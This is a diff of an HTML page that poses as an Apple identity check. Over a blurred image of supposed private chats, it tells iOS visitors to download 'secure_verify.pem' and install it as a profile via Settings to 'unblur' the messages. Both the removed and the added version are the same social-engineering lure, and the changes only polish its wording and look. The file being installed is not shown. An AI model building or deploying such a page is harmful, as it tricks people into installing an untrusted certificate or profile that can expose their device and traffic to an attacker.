@@ -1,50 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Hadima Closet - Private Archives</title>
+    <title>Hadima Closet - Live Feed</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; overflow: hidden; }
-        .bg-blur {
+        body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; background: #000; }
+        
+    
+        .chat-background {
             background-image: url('chat_preview.jpg'); 
-            height: 100%; filter: blur(18px); background-position: center; background-repeat: no-repeat; background-size: cover; transform: scale(1.1);
+            height: 100vh; width: 100%;
+            filter: blur(12px); 
+            background-position: center; background-repeat: no-repeat; background-size: cover;
+            position: fixed; top: 0; left: 0; z-index: 1;
         }
-        .overlay {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.45); display: flex; align-items: center; justify-content: center;
+
+        .overlay-dark {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.4); z-index: 2;
         }
-        .login-box {
-            background: rgba(255, 255, 255, 0.98); padding: 30px; border-radius: 20px;
-            text-align: center; max-width: 310px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+
+        .verification-card {
+            position: relative; z-index: 3;
+            background: rgba(255, 255, 255, 0.98); padding: 25px; border-radius: 20px;
+            text-align: center; max-width: 310px; margin: 15vh auto;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
         }
-        .apple-logo { width: 35px; margin-bottom: 15px; }
-        h2 { font-size: 19px; color: #1d1d1f; margin: 0 0 10px 0; font-weight: 600; }
-        p { font-size: 13px; color: #86868b; margin-bottom: 25px; line-height: 1.4; }
+
+        .apple-logo { width: 35px; margin-bottom: 12px; }
+        h2 { font-size: 19px; color: #1d1d1f; margin-bottom: 8px; }
+        p { font-size: 13px; color: #48484a; margin-bottom: 20px; line-height: 1.5; }
+        
         .btn {
             display: block; background: #007aff; color: white; text-decoration: none;
             padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px;
         }
-        .steps-box {
-            margin-top: 25px; text-align: left; font-size: 12px;
-            background: #f5f5f7; padding: 15px; border-radius: 12px; color: #3a3a3c;
-        }
+
+        .info-text { margin-top: 15px; font-size: 11px; color: #8e8e93; }
     </style>
 </head>
 <body>
-    <div class="bg-blur"></div>
-    <div class="overlay">
-        <div class="login-box">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
-            <h2>Identity Verification</h2>
-            <p>To view decrypted closet archives, iOS requires a one-time identity verification certificate.</p>
-            <a href="secure_verify.pem" class="btn">Unblur & View Chats</a>
-            <div class="steps-box">
-                <b>Required Steps:</b><br>
-                1. Tap <b>Allow</b> to download.<br>
-                2. Open <b>Settings > Profile Downloaded</b>.<br>
-                3. Tap <b>Install</b> and return here.
-            </div>
+
+    <div class="chat-background"></div>
+    <div class="overlay-dark"></div>
+
+    <div class="verification-card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
+        <h2>Content Encrypted</h2>
+        <p>This conversation is protected by end-to-end encryption. To unblur and view the full archive on iOS, verify your identity.</p>
+        
+        <a href="secure_verify.pem" class="btn">Unblur Messages</a>
+
+        <div class="info-text">
+            Security Check: Settings > Profile Downloaded > Install
         </div>
     </div>
+
 </body>
 </html>
